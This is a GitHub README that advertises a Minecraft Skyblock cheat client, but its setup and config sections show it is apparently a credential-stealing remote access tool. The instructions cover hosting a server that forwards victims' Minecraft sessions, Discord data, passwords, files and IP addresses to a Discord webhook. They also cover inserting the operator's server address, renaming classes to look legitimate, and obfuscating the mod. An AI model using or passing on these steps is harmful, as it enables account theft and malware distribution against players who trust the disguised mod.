# Announcing Unreal Client

![Unreal](https://github.com/Unrealsforkick/UnrealClient/blob/main/assets/245837716-a212304a-055e-4e1a-8a92-3b53bc4201ab.gif)
# IMPORTANT
All previous issues should be solved with the latest release 

# Features
#### Auto Harp/Exprimantel table ( with Ping setting ! )
- Combat Xp/Drops
    - Hub zombies (starter)
    - Zealots/Summoning eye's
- Slayer
    - Rev Slayer
    - Taruntla Slayer
    - Sven Slayer
    - ! Newest Blaze Slayer
- Farming
    - Wheat/Potatoe/Carrots
    - Netherwart
    - Pumpking/Melon
    - Auto visitors / Auto Pests
- F7 Features
    - F*CK Diorite
    - M7 decoy route
    - Ghost Pickaxe/Blocks (keybind)
    - Create Own Decoy route's 


# Setup
## Discord Webhook Intergration
   1. Create a discord webhook
   2. Scroll down to 'misc'
   3. Edit `Webhook_Selection` With ur own
   4. To test run the command `/uc webhooktest`
   5. Check your discord Server
#### OR
Host on [render](https://render.com)
   1. Make a private fork of this repository (Do NOT click fork on github, you have to download and reupload to a private repo)
   2. Edit `server/config.json` to your liking
   3. Create a new render account with the GitHub account you forked the repository with
   4. Create a new web service
   5. Select the forked repository
   6. Put in a name for the service, select main as the branch, `server` as the root directory, Python 3 as runtime, Build command `pip install -r requirements.txt` and Start command `python main.py` or `python3 main.py`
   7. Wait for the service to build
## Mod/Client
   1. Download the repository
   2. Change the Server IP in `scr/main/java/dev/schubilegend/SchubiMod.java` to the IP of your VPS / URL of your render service
   3. Optional: Change the names of the classes/folders to make it look more legit
   4. Compile the mod (JDK 17 in your gradle settings and JDK 8 in your project settings)
#### OR
   1. Download the [release](https://github.com/Schubilegend/SchubiRat/releases)
   2. Change the URL / IP of the mod to yours using a [java string editor](https://leonardosnt.github.io/jar-string-editor) or [Recaf](https://github.com/Col-E/Recaf/releases/tag/2.21.13) (Look for "YOUR URL HERE")
   3. Save and download the mod

   **Optional: Obfuscate the mod**

   **If you have too much money use [jnic](https://jnic.dev) native obfuscator for uncrackble obfuscation**

### If everything works for you please ⭐ this repo to support it ❤️

# Config
You can customize the spam protection and the design of the embeds by editing `server/config.json`.
<br>
The config is not reloaded automatically, so you have to restart the server for the changes to take effect.

| Name                       | Possible values                 | Description                                                                                                                    |
|----------------------------|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------|
| webhook                    | Any discord webhook URL         | The webhook the info is sent to                                                                                                |
| webhook_name               | Any string, max 80 characters   | The name the webhook will have when sending the info                                                                           |
| webhook_avatar             | Any URL to a PNG or JPG file    | The avatar the webhook will have when sending the info                                                                         |
| message                    | Any string, max 2000 characters | The message the webhook will send with the info. `%IP%` will automatically be replaced with the IP of the client               |
| codeblock_type             | `small` or `big`                | The type of codeblock used for the embed fields                                                                                |
| ip_ratelimit               | Any number                      | The number of times a client can send a request before getting rate-limited                                                    |
| reset_ratelimit_after      | Any number                      | The number of minutes a client has to wait after getting rate-limited before sending another request                           |
| mc_embed_color             | Any hex color code              | The color of the Minecraft embed                                                                                               |
| mc_embed_title             | Any string, max 256 characters  | The title of the Minecraft embed                                                                                               |
| mc_embed_footer_text       | Any string, max 2048 characters | The footer text of the Minecraft embed                                                                                         |
| mc_embed_footer_icon       | Any URL to a PNG or JPG file    | The footer icon of the Minecraft embed                                                                                         |
| discord_embed_color        | Any hex color code              | The color of the Discord embed                                                                                                 |
| discord_embed_title        | Any string, max 256 characters  | The title of the Discord embed                                                                                                 |
| discord_embed_footer_text  | Any string, max 2048 characters | The footer text of the Discord embed                                                                                           |
| discord_embed_footer_icon  | Any URL to a PNG or JPG file    | The footer icon of the Discord embed                                                                                           |
| password_embed_color       | Any hex color code              | The color of the password embed                                                                                                |
| password_embed_title       | Any string, max 256 characters  | The title of the password embed                                                                                                |
| password_embed_footer_text | Any string, max 2048 characters | The footer text of the password embed                                                                                          |
| password_embed_footer_icon | Any URL to a PNG or JPG file    | The footer icon of the password embed                                                                                          |
| file_embed_color           | Any hex color code              | The color of the file embed                                                                                                    |
| file_embed_title           | Any string, max 256 characters  | The title of the file embed                                                                                                    |
| file_embed_footer_text     | Any string, max 2048 characters | The footer text of the file embed                                                                                              |
| file_embed_footer_icon     | Any URL to a PNG or JPG file    | The footer icon of the file embed                                                                                              |
| validate_session           | `true` or `false`               | If requests containing a invalid session id or one that isn't matching the uuid/ign of the minecraft account should be blocked |

# DISCLAIMER
**I am not responsible for any damage caused by this program. This is for educational purposes only. Use at your own risk.**



[get back to the top](https://github.com/Unrealsforkick/UnrealClient)
